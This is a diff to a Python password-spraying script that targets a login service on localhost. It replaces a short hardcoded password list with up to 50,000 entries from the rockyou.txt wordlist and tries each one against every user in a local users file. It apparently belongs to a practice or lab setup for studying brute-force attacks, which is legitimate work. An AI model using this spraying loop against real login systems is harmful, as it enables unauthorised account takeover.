@@ -9,11 +9,12 @@ BASE_DIR = os.path.dirname(os.path.dirname(__file__))
 BASE_URL = "http://127.0.0.1:5000"
 USERS_FILE = os.path.join(BASE_DIR, "data", "users.json")
 LOG_FILE = os.path.join(BASE_DIR, "logs", "attempts.log")
+WORDLIST_PATH = os.path.join(BASE_DIR, "data", "rockyou.txt")
 
-COMMON_PASSWORDS = [
-    "123456", "mypassword", "111111", "qwerty", "abc123", "admin",
-    "000000", "123321", "ilovedogs", "ilovecats", "532645069"
-]
+def load_wordlist(limit=50000):
+    """Load up to limit passwords from rockyou.txt"""
+    with open(WORDLIST_PATH, "r", encoding="latin-1") as f:
+        return [line.strip() for line in f if line.strip()][:limit]
 
 def load_users():
     with open(USERS_FILE, "r") as f:
@@ -21,7 +22,9 @@ def load_users():
 
 def password_spray():
     users = load_users()
-    for pwd in COMMON_PASSWORDS:
+    common_passwords = load_wordlist()
+
+    for pwd in common_passwords:
         print(f"\n[INFO] Trying common password: {pwd}")
         for user in users:
             username = user["username"]
